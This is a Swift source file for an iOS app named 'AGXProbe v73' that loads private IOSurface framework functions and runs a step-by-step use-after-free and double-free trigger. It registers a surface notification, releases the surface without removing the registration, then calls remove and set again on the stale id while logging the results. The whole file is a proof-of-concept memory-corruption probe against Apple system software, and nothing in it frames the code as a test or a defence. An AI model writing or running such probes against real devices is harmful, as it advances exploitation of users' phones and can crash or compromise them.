import SwiftUI
import Darwin
import Foundation
import CoreFoundation

@main
struct AGXProbeApp: App {
    var body: some Scene { WindowGroup { ContentView() } }
}

struct ContentView: View {
    @StateObject private var vm = ReachViewModel()
    var body: some View {
        VStack(spacing: 12) {
            Text("AGXProbe v73 - UAF step-by-step logging").font(.headline)
            ScrollView {
                Text(vm.log)
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundColor(.green)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(6).background(Color.black.opacity(0.85)).cornerRadius(6)
            }
            Button(action: { Task { await vm.runProbe() } }) {
                Text(vm.isRunning ? "Probing..." : "Run v73")
                    .font(.headline).foregroundColor(.white)
                    .frame(maxWidth: .infinity).padding(10)
                    .background(vm.isRunning ? Color.gray : Color.blue).cornerRadius(8)
            }.disabled(vm.isRunning)
            Text("Status: \(vm.status)").font(.caption2).foregroundColor(.secondary)
            Spacer(minLength: 0)
        }
        .padding().task { await vm.autoRunIfRequested() }
    }
}

@MainActor
final class ReachViewModel: ObservableObject {
    @Published var log = ""
    @Published var status = "Ready"
    @Published var isRunning = false
    private var didAutoRun = false

    private let logFileURL: URL = {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("reach.log")
    }()

    private func emit(_ m: String) {
        log += m + "\n"; print(m); fflush(stdout)
        try? log.write(to: logFileURL, atomically: true, encoding: .utf8)
    }

    func autoRunIfRequested() async {
        guard !didAutoRun else { return }
        didAutoRun = true
        if ProcessInfo.processInfo.arguments.contains("--autorun") { await runProbe() }
    }

    func runProbe() async {
        isRunning = true; status = "Probing..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        emit("=== AGXProbe v73 - step-by-step ===")
        try? await Task.sleep(nanoseconds: 1_000_000_000)

        guard let fwH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW) else {
            emit("[-] dlopen fail"); status = "Complete"; isRunning = false; return
        }
        emit("[1] dlopen OK")

        guard let setSym = dlsym(fwH, "IOSurfaceClientSetSurfaceNotify"),
              let remSym = dlsym(fwH, "IOSurfaceClientRemoveSurfaceNotify"),
              let createSym = dlsym(fwH, "IOSurfaceCreate"),
              let getIdSym = dlsym(fwH, "IOSurfaceGetID") else {
            emit("[-] dlsym fail"); status = "Complete"; isRunning = false; return
        }
        emit("[2] dlsym OK")

        let gSet = unsafeBitCast(setSym, to: (@convention(c) (mach_port_t, UInt64, UInt64) -> kern_return_t).self)
        let gRemove = unsafeBitCast(remSym, to: (@convention(c) (UInt64) -> kern_return_t).self)
        let gCreate = unsafeBitCast(createSym, to: (@convention(c) (CFDictionary) -> UnsafeMutableRawPointer?).self)
        let gGetID = unsafeBitCast(getIdSym, to: (@convention(c) (UnsafeMutableRawPointer) -> UInt32).self)
        emit("[3] symbols cast OK")

        var gPort: mach_port_t = 0
        var kr = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &gPort)
        emit("[4] port_allocate kr=0x\(String(kr, radix: 16)) port=0x\(String(gPort, radix: 16))")
        if kr != KERN_SUCCESS { status = "Complete"; isRunning = false; return }

        // Create surface
        var keyCB = kCFTypeDictionaryKeyCallBacks
        var valCB = kCFTypeDictionaryValueCallBacks
        let props = CFDictionaryCreateMutable(nil, 0, &keyCB, &valCB) as! NSMutableDictionary
        props["IOSurfaceWidth"] = 256
        props["IOSurfaceHeight"] = 256
        props["IOSurfaceBytesPerElement"] = 4
        emit("[5] props created")

        emit("[6] calling gCreate...")
        var surf: UnsafeMutableRawPointer? = gCreate(props)
        emit("[7] gCreate returned: \(surf != nil)")
        guard let s = surf else {
            emit("[-] create failed"); status = "Complete"; isRunning = false; return
        }
        emit("[8] surface created")

        let sid = gGetID(s)
        emit("[9] getID returned: 0x\(String(sid, radix: 16))")

        emit("[10] calling set_notify...")
        let krSet = gSet(gPort, 1, UInt64(sid))
        emit("[11] set_notify kr=0x\(String(krSet, radix: 16))")

        emit("[12] releasing surface without remove...")
        Unmanaged<AnyObject>.fromOpaque(s).release()
        emit("[13] surface released")

        emit("[14] calling remove_notify on stale id...")
        let krRem = gRemove(UInt64(sid))
        emit("[15] remove_notify kr=0x\(String(krRem, radix: 16))")

        emit("[16] calling remove_notify again (double-free test)...")
        let krRem2 = gRemove(UInt64(sid))
        emit("[17] remove_notify again kr=0x\(String(krRem2, radix: 16))")

        emit("[18] calling set_notify again on stale id...")
        let krSet2 = gSet(gPort, 1, UInt64(sid))
        emit("[19] set_notify again kr=0x\(String(krSet2, radix: 16))")

        emit("\n=== done ===")
        status = "Complete"; isRunning = false
    }
}
